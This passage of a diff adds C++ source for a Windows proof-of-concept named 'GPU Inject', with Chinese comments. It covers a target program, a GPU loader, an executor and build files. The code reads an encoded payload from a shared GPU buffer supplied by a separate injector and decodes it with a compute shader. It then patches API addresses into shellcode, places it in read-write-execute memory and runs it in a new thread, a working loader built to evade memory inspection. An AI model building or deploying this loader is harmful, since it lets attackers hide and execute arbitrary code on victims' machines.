+    void* messageBoxAddr = GetProcAddress(user32, "MessageBoxA");
+    void* exitThreadAddr = GetProcAddress(kernel32, "ExitThread");
+
+    if (!messageBoxAddr || !exitThreadAddr) {
+        std::cerr << "[executor] failed to resolve api addresses\n";
+        return;
+    }
+
+    uint64_t msgBoxAddr = reinterpret_cast<uint64_t>(messageBoxAddr);
+    // 将 MessageBoxA / ExitThread 的真实地址写回 payload，以保证在目标进程内可调用。
+    for (int i = 0; i < 8; i++) {
+        shellcode[26 + i] = static_cast<uint8_t>((msgBoxAddr >> (i * 8)) & 0xFF);
+    }
+
+    uint64_t exitAddr = reinterpret_cast<uint64_t>(exitThreadAddr);
+    for (int i = 0; i < 8; i++) {
+        shellcode[41 + i] = static_cast<uint8_t>((exitAddr >> (i * 8)) & 0xFF);
+    }
+}
+
+bool Executor::executeShellcode(std::vector<uint8_t>& shellcode) {
+    if (shellcode.empty()) {
+        std::cerr << "[executor] empty shellcode\n";
+        return false;
+    }
+
+    patchShellcodeAddresses(shellcode);
+
+    allocatedSize = shellcode.size();
+    // 为 shellcode 分配 RWX 内存，PoC 场景保持简单，生产环境应减少 RWX 窗口。
+    allocatedMemory = VirtualAlloc(
+        nullptr,
+        allocatedSize,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE
+    );
+
+    if (!allocatedMemory) {
+        std::cerr << "[executor] failed to allocate rwx memory\n";
+        return false;
+    }
+
+    memcpy(allocatedMemory, shellcode.data(), allocatedSize);
+
+    // 将解码后的 shellcode 作为线程入口，执行完后由 shellcode 自行调用 ExitThread。
+    HANDLE hThread = CreateThread(
+        nullptr,
+        0,
+        reinterpret_cast<LPTHREAD_START_ROUTINE>(allocatedMemory),
+        nullptr,
+        0,
+        nullptr
+    );
+
+    if (!hThread) {
+        std::cerr << "[executor] failed to create thread\n";
+        return false;
+    }
+
+    CloseHandle(hThread);
+
+    return true;
+}
+
+```
+
+`Target/Executor.h`:
+
+```h
+#pragma once
+#include <windows.h>
+#include <cstdint>
+#include <vector>
+
+class Executor {
+public:
+    Executor();
+    ~Executor();
+
+    bool executeShellcode(std::vector<uint8_t>& shellcode);
+
+private:
+    void* allocatedMemory;
+    SIZE_T allocatedSize;
+
+    void patchShellcodeAddresses(std::vector<uint8_t>& shellcode);
+};
+
+```
+
+`Target/GPULoader.cpp`:
+
+```cpp
+#include "GPULoader.h"
+#include "SharedStructures.h"
+#include <d3dcompiler.h>
+#include <iostream>
+#include <fstream>
+#include <vector>
+
+GPULoader::GPULoader()
+    : device(nullptr)
+    , context(nullptr)
+    , encodedBuffer(nullptr)
+    , decodedBuffer(nullptr)
+    , stagingBuffer(nullptr)
+    , constantBuffer(nullptr)
+    , decodeShader(nullptr)
+    , encodedSRV(nullptr)
+    , decodedUAV(nullptr)
+    , sharedBufferHandle(nullptr)
+    , payloadSize(0)
+    , encodeKey(0)
+{
+}
+
+GPULoader::~GPULoader() {
+    cleanup();
+}
+
+bool GPULoader::initialize() {
+    D3D_FEATURE_LEVEL featureLevel;
+    UINT createFlags = 0;
+
+#ifdef _DEBUG
+    createFlags |= D3D11_CREATE_DEVICE_DEBUG;
+#endif
+
+    HRESULT hr = D3D11CreateDevice(
+        nullptr,
+        D3D_DRIVER_TYPE_HARDWARE,
+        nullptr,
+        createFlags,
+        nullptr,
+        0,
+        D3D11_SDK_VERSION,
+        &device,
+        &featureLevel,
+        &context
+    );
+
+    if (FAILED(hr)) {
+        std::cerr << "[gpuloader] failed to create d3d11 device\n";
+        return false;
+    }
+
+    return loadComputeShader();
+}
+
+bool GPULoader::loadComputeShader() {
+    std::ifstream shaderFile("..\\..\\Shaders\\DecodePayload.cso", std::ios::binary | std::ios::ate);
+    if (!shaderFile.is_open()) {
+        std::cerr << "[gpuloader] failed to open shader file\n";
+        return false;
+    }
+
+    std::streamsize size = shaderFile.tellg();
+    shaderFile.seekg(0, std::ios::beg);
+
+    std::vector<char> shaderBytecode(size);
+    if (!shaderFile.read(shaderBytecode.data(), size)) {
+        std::cerr << "[gpuloader] failed to read shader\n";
+        return false;
+    }
+
+    // 目标端只保存编译好的字节码，运行时加载到 D3D 设备。
+    HRESULT hr = device->CreateComputeShader(
+        shaderBytecode.data(),
+        shaderBytecode.size(),
+        nullptr,
+        &decodeShader
+    );
+
+    if (FAILED(hr)) {
+        std::cerr << "[gpuloader] failed to create compute shader\n";
+        return false;
+    }
+
+    return true;
+}
+
+bool GPULoader::loadSharedGPUData() {
+    // 读取 Injector 写入的共享内存以取得共享缓冲句柄及元数据。
+    HANDLE hSharedMem = OpenFileMappingW(
+        FILE_MAP_READ,
+        FALSE,
+        GPUInject::SHARED_MEMORY_NAME
+    );
+
+    if (!hSharedMem) {
+        std::cerr << "[gpuloader] failed to open shared memory\n";
+        return false;
+    }
+
+    void* mappedView = MapViewOfFile(
+        hSharedMem,
+        FILE_MAP_READ,
+        0,
+        0,
+        sizeof(GPUInject::SharedGPUData)
+    );
+
+    if (!mappedView) {
+        std::cerr << "[gpuloader] failed to map view\n";
+        CloseHandle(hSharedMem);
+        return false;
+    }
+
+    GPUInject::SharedGPUData* sharedData = static_cast<GPUInject::SharedGPUData*>(mappedView);
+    sharedBufferHandle = sharedData->encodedBufferHandle;
+    payloadSize = sharedData->payloadSize;
+    encodeKey = sharedData->encodeKey;
+
+    UnmapViewOfFile(mappedView);
+    CloseHandle(hSharedMem);
+
+    return openSharedBuffer();
+}
+
+bool GPULoader::openSharedBuffer() {
+    // 将 DXGI 共享句柄重新打开成当前设备可用的 ID3D11Buffer。
+    HRESULT hr = device->OpenSharedResource(
+        sharedBufferHandle,
+        __uuidof(ID3D11Buffer),
+        (void**)&encodedBuffer
+    );
+
+    if (FAILED(hr)) {
+        std::cerr << "[gpuloader] failed to open shared buffer\n";
+        return false;
+    }
+
+    IDXGIKeyedMutex* keyedMutex = nullptr;
+    hr = encodedBuffer->QueryInterface(__uuidof(IDXGIKeyedMutex), (void**)&keyedMutex);
+    if (SUCCEEDED(hr)) {
+        hr = keyedMutex->AcquireSync(0, INFINITE);
+        if (FAILED(hr)) {
+            std::cerr << "[gpuloader] failed to acquire keyed mutex\n";
+            keyedMutex->Release();
+            return false;
+        }
+        keyedMutex->Release();
+    }
+
+    return createDecodeResources();
+}
+
+bool GPULoader::createDecodeResources() {
+    D3D11_BUFFER_DESC encodedDesc;
+    encodedBuffer->GetDesc(&encodedDesc);
+
+    // 为共享缓冲区创建 SRV/UAV，从而在计算着色器中读取编码数据并写入解码结果。
+    D3D11_SHADER_RESOURCE_VIEW_DESC srvDesc = {};
+    srvDesc.Format = DXGI_FORMAT_UNKNOWN;
+    srvDesc.ViewDimension = D3D11_SRV_DIMENSION_BUFFER;
+    srvDesc.Buffer.FirstElement = 0;
+    srvDesc.Buffer.NumElements = encodedDesc.ByteWidth / sizeof(uint32_t);
+
+    HRESULT hr = device->CreateShaderResourceView(encodedBuffer, &srvDesc, &encodedSRV);
+    if (FAILED(hr)) {
+        std::cerr << "[gpuloader] failed to create srv\n";
+        return false;
+    }
+
+    D3D11_BUFFER_DESC decodedDesc = {};
+    decodedDesc.ByteWidth = encodedDesc.ByteWidth;
+    decodedDesc.Usage = D3D11_USAGE_DEFAULT;
+    decodedDesc.BindFlags = D3D11_BIND_UNORDERED_ACCESS;
+    decodedDesc.MiscFlags = D3D11_RESOURCE_MISC_BUFFER_STRUCTURED;
+    decodedDesc.StructureByteStride = sizeof(uint32_t);
+
+    hr = device->CreateBuffer(&decodedDesc, nullptr, &decodedBuffer);
+    if (FAILED(hr)) {
+        std::cerr << "[gpuloader] failed to create decoded buffer\n";
+        return false;
+    }
+
+    D3D11_UNORDERED_ACCESS_VIEW_DESC uavDesc = {};
+    uavDesc.Format = DXGI_FORMAT_UNKNOWN;
+    uavDesc.ViewDimension = D3D11_UAV_DIMENSION_BUFFER;
+    uavDesc.Buffer.FirstElement = 0;
+    uavDesc.Buffer.NumElements = encodedDesc.ByteWidth / sizeof(uint32_t);
+
+    hr = device->CreateUnorderedAccessView(decodedBuffer, &uavDesc, &decodedUAV);
+    if (FAILED(hr)) {
+        std::cerr << "[gpuloader] failed to create uav\n";
+        return false;
+    }
+
+    // CPU 侧 staging buffer 用于 CopyResource 后 map 回系统内存。
+    D3D11_BUFFER_DESC stagingDesc = {};
+    stagingDesc.ByteWidth = encodedDesc.ByteWidth;
+    stagingDesc.Usage = D3D11_USAGE_STAGING;
+    stagingDesc.CPUAccessFlags = D3D11_CPU_ACCESS_READ;
+
+    hr = device->CreateBuffer(&stagingDesc, nullptr, &stagingBuffer);
+    if (FAILED(hr)) {
+        std::cerr << "[gpuloader] failed to create staging buffer\n";
+        return false;
+    }
+
+    struct DecodeParams {
+        uint32_t payloadSizeInDwords;
+        uint32_t encodeKey;
+        uint32_t padding[2];
+    };
+
+    DecodeParams params;
+    params.payloadSizeInDwords = (payloadSize + 3) / 4;
+    params.encodeKey = encodeKey;
+
+    // 常量缓冲封装 payload 总长度与密钥，供 compute shader 复原字流。
+    D3D11_BUFFER_DESC cbDesc = {};
+    cbDesc.ByteWidth = sizeof(DecodeParams);
+    cbDesc.Usage = D3D11_USAGE_DEFAULT;
+    cbDesc.BindFlags = D3D11_BIND_CONSTANT_BUFFER;
+
+    D3D11_SUBRESOURCE_DATA cbData = {};
+    cbData.pSysMem = &params;
+
+    hr = device->CreateBuffer(&cbDesc, &cbData, &constantBuffer);
+    if (FAILED(hr)) {
+        std::cerr << "[gpuloader] failed to create constant buffer\n";
+        return false;
+    }
+
+    return true;
+}
+
+bool GPULoader::decodePayloadOnGPU() {
+    // 设置计算着色器绑定并 dispatch，逆向执行与 Injector 同样的混淆逻辑。
+    context->CSSetShader(decodeShader, nullptr, 0);
+    context->CSSetShaderResources(0, 1, &encodedSRV);
+    context->CSSetUnorderedAccessViews(0, 1, &decodedUAV, nullptr);
+    context->CSSetConstantBuffers(0, 1, &constantBuffer);
+
+    uint32_t numDwords = (payloadSize + 3) / 4;
+    uint32_t numGroups = (numDwords + GPUInject::DECODE_THREAD_GROUP_SIZE - 1) /
+                         GPUInject::DECODE_THREAD_GROUP_SIZE;
+
+    context->Dispatch(numGroups, 1, 1);
+
+    ID3D11ShaderResourceView* nullSRV = nullptr;
+    ID3D11UnorderedAccessView* nullUAV = nullptr;
+    context->CSSetShaderResources(0, 1, &nullSRV);
+    context->CSSetUnorderedAccessViews(0, 1, &nullUAV, nullptr);
+
+    // 将 GPU 解码结果拷贝到 staging buffer，便于后续 Map。
+    context->CopyResource(stagingBuffer, decodedBuffer);
+
+    return true;
+}
+
+std::vector<uint8_t> GPULoader::retrieveDecodedPayload() {
+    std::vector<uint8_t> payload;
+
+    D3D11_MAPPED_SUBRESOURCE mapped;
+    // Map 后直接复制 payloadSize 字节回到 CPU 内存。
+    HRESULT hr = context->Map(stagingBuffer, 0, D3D11_MAP_READ, 0, &mapped);
+    if (FAILED(hr)) {
+        std::cerr << "[gpuloader] failed to map staging buffer\n";
+        return payload;
+    }
+
+    payload.resize(payloadSize);
+    memcpy(payload.data(), mapped.pData, payloadSize);
+
+    context->Unmap(stagingBuffer, 0);
+
+    return payload;
+}
+
+void GPULoader::cleanup() {
+    if (encodedSRV) {
+        encodedSRV->Release();
+        encodedSRV = nullptr;
+    }
+    if (decodedUAV) {
+        decodedUAV->Release();
+        decodedUAV = nullptr;
+    }
+    if (decodeShader) {
+        decodeShader->Release();
+        decodeShader = nullptr;
+    }
+    if (constantBuffer) {
+        constantBuffer->Release();
+        constantBuffer = nullptr;
+    }
+    if (stagingBuffer) {
+        stagingBuffer->Release();
+        stagingBuffer = nullptr;
+    }
+    if (decodedBuffer) {
+        decodedBuffer->Release();
+        decodedBuffer = nullptr;
+    }
+    if (encodedBuffer) {
+        encodedBuffer->Release();
+        encodedBuffer = nullptr;
+    }
+    if (context) {
+        context->Release();
+        context = nullptr;
+    }
+    if (device) {
+        device->Release();
+        device = nullptr;
+    }
+}
+
+```
+
+`Target/GPULoader.h`:
+
+```h
+#pragma once
+#include <d3d11.h>
+#include <dxgi.h>
+#include <cstdint>
+#include <vector>
+
+class GPULoader {
+public:
+    GPULoader();
+    ~GPULoader();
+
+    bool initialize();
+    bool loadSharedGPUData();
+    bool decodePayloadOnGPU();
+    std::vector<uint8_t> retrieveDecodedPayload();
+    void cleanup();
+
+private:
+    ID3D11Device* device;
+    ID3D11DeviceContext* context;
+    ID3D11Buffer* encodedBuffer;
+    ID3D11Buffer* decodedBuffer;
+    ID3D11Buffer* stagingBuffer;
+    ID3D11Buffer* constantBuffer;
+    ID3D11ComputeShader* decodeShader;
+    ID3D11ShaderResourceView* encodedSRV;
+    ID3D11UnorderedAccessView* decodedUAV;
+
+    HANDLE sharedBufferHandle;
+    uint32_t payloadSize;
+    uint32_t encodeKey;
+
+    bool loadComputeShader();
+    bool openSharedBuffer();
+    bool createDecodeResources();
+};
+
+```
+
+`Target/Target.vcxproj`:
+
+```vcxproj
+<?xml version="1.0" encoding="utf-8"?>
+<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup Label="ProjectConfigurations">
+    <ProjectConfiguration Include="Debug|x64">
+      <Configuration>Debug</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|x64">
+      <Configuration>Release</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+  </ItemGroup>
+  <PropertyGroup Label="Globals">
+    <VCProjectVersion>17.0</VCProjectVersion>
+    <ProjectGuid>{B8D9E8F2-5E4B-5C6D-A03F-2B3C4D5E6F70}</ProjectGuid>
+    <Keyword>Win32Proj</Keyword>
+    <RootNamespace>Target</RootNamespace>
+    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <LinkIncremental>true</LinkIncremental>
+    <OutDir>$(SolutionDir)bin\$(Configuration)\</OutDir>
+    <IntDir>$(SolutionDir)obj\$(ProjectName)\$(Configuration)\</IntDir>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <LinkIncremental>false</LinkIncremental>
+    <OutDir>$(SolutionDir)bin\$(Configuration)\</OutDir>
+    <IntDir>$(SolutionDir)obj\$(ProjectName)\$(Configuration)\</IntDir>
+  </PropertyGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>_DEBUG;_WINDOWS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+      <LanguageStandard>stdcpp17</LanguageStandard>
+      <AdditionalIncludeDirectories>$(SolutionDir)Common;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+    </ClCompile>
+    <Link>
+      <SubSystem>Windows</SubSystem>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+      <AdditionalDependencies>d3d11.lib;dxgi.lib;d3dcompiler.lib;%(AdditionalDependencies)</AdditionalDependencies>
+    </Link>
+    <FxCompile>
+      <ShaderModel>5.0</ShaderModel>
+      <ShaderType>Compute</ShaderType>
+      <EntryPointName>DecodePayloadCS</EntryPointName>
+      <ObjectFileOutput>$(SolutionDir)Shaders\%(Filename).cso</ObjectFileOutput>
+    </FxCompile>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>NDEBUG;_WINDOWS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+      <LanguageStandard>stdcpp17</LanguageStandard>
+      <AdditionalIncludeDirectories>$(SolutionDir)Common;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+    </ClCompile>
+    <Link>
+      <SubSystem>Windows</SubSystem>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <OptimizeReferences>true</OptimizeReferences>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+      <AdditionalDependencies>d3d11.lib;dxgi.lib;d3dcompiler.lib;%(AdditionalDependencies)</AdditionalDependencies>
+    </Link>
+    <FxCompile>
+      <ShaderModel>5.0</ShaderModel>
+      <ShaderType>Compute</ShaderType>
+      <EntryPointName>DecodePayloadCS</EntryPointName>
+      <ObjectFileOutput>$(SolutionDir)Shaders\%(Filename).cso</ObjectFileOutput>
+    </FxCompile>
+  </ItemDefinitionGroup>
+  <ItemGroup>
+    <ClCompile Include="TargetWindow.cpp" />
+    <ClCompile Include="GPULoader.cpp" />
+    <ClCompile Include="Executor.cpp" />
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="GPULoader.h" />
+    <ClInclude Include="Executor.h" />
+  </ItemGroup>
+  <ItemGroup>
+    <FxCompile Include="..\Shaders\DecodePayload.hlsl">
+      <ShaderType>Compute</ShaderType>
+      <ShaderModel>5.0</ShaderModel>
+      <EntryPointName>DecodePayloadCS</EntryPointName>
+    </FxCompile>
+  </ItemGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
+</Project>
+
+```
+
+`Target/TargetWindow.cpp`:
+
+```cpp
+#include "GPULoader.h"
+#include "Executor.h"
+#include "SharedStructures.h"
+#include <windows.h>
+#include <iostream>
+#include <thread>
+
+LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
+    switch (uMsg) {
+        case WM_DESTROY:
+            PostQuitMessage(0);
+            return 0;
+        case WM_PAINT: {
+            PAINTSTRUCT ps;
+            HDC hdc = BeginPaint(hwnd, &ps);
+            FillRect(hdc, &ps.rcPaint, (HBRUSH)(COLOR_WINDOW + 1));
+            EndPaint(hwnd, &ps);
+            return 0;
+        }
+    }
+    return DefWindowProc(hwnd, uMsg, wParam, lParam);
+}
+
+void gpuInjectionThread() {
+    // 预加载常用模块，确保 Executor 在解析 API 时能立即找到导出。
+    LoadLibraryA("user32.dll");
+    LoadLibraryA("kernel32.dll");
+
+    // 与 Injector 通过命名事件同步：准备、解码完成、执行完成。
+    HANDLE payloadReadyEvent = OpenEventW(EVENT_ALL_ACCESS, FALSE, GPUInject::PAYLOAD_READY_EVENT);
+    HANDLE decodeCompleteEvent = OpenEventW(EVENT_ALL_ACCESS, FALSE, GPUInject::DECODE_COMPLETE_EVENT);
+    HANDLE executionCompleteEvent = OpenEventW(EVENT_ALL_ACCESS, FALSE, GPUInject::EXECUTION_COMPLETE_EVENT);
+
+    if (!payloadReadyEvent || !decodeCompleteEvent || !executionCompleteEvent) {
+        std::cerr << "[target] failed to open sync events\n";
+        return;
+    }
+
+    // 等待 Injector 通知后再去读取共享句柄，避免未写完数据。
+    WaitForSingleObject(payloadReadyEvent, INFINITE);
+
+    std::cout << "[target] decoding payload on gpu\n";
+
+    GPULoader loader;
+    if (!loader.initialize()) {
+        std::cerr << "[target] failed to initialize gpu loader\n";
+        return;
+    }
+
+    if (!loader.loadSharedGPUData()) {
+        std::cerr << "[target] failed to load shared gpu data\n";
+        return;
+    }
+
+    if (!loader.decodePayloadOnGPU()) {
+        std::cerr << "[target] failed to decode payload\n";
+        return;
+    }
+
+    std::vector<uint8_t> decodedPayload = loader.retrieveDecodedPayload();
+
+    if (decodedPayload.empty()) {
+        std::cerr << "[target] failed to retrieve payload\n";
+        return;
+    }
+
+    SetEvent(decodeCompleteEvent);
+
+    std::cout << "[target] executing payload (" << decodedPayload.size() << " bytes)\n";
+
+    Executor executor;
+    if (!executor.executeShellcode(decodedPayload)) {
+        std::cerr << "[target] failed to execute shellcode\n";
+        return;
+    }
+
+    SetEvent(executionCompleteEvent);
+
+    Sleep(10000);
+
+    CloseHandle(payloadReadyEvent);
+    CloseHandle(decodeCompleteEvent);
+    CloseHandle(executionCompleteEvent);
+}
+
+int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
+    AllocConsole();
+    FILE* fDummy;
+    freopen_s(&fDummy, "CONOUT$", "w", stdout);
+    freopen_s(&fDummy, "CONOUT$", "w", stderr);
+
+    const wchar_t CLASS_NAME[] = L"GPUInjectTargetWindow";
+
+    WNDCLASSW wc = {};
+    wc.lpfnWndProc = WindowProc;
+    wc.hInstance = hInstance;
+    wc.lpszClassName = CLASS_NAME;
+    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
+
+    RegisterClassW(&wc);
+
+    HWND hwnd = CreateWindowExW(
+        0,
+        CLASS_NAME,
+        L"GPU Inject Target",
+        WS_OVERLAPPEDWINDOW,
+        CW_USEDEFAULT, CW_USEDEFAULT, 640, 480,
+        nullptr,
+        nullptr,
+        hInstance,
+        nullptr
+    );
+
+    if (hwnd == nullptr) {
+        return 0;
+    }
+
+    ShowWindow(hwnd, nCmdShow);
+
+    std::thread injectionThread(gpuInjectionThread);
+    injectionThread.detach();
+
+    MSG msg = {};
+    while (GetMessage(&msg, nullptr, 0, 0)) {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+
+    return 0;
+}
+
+```
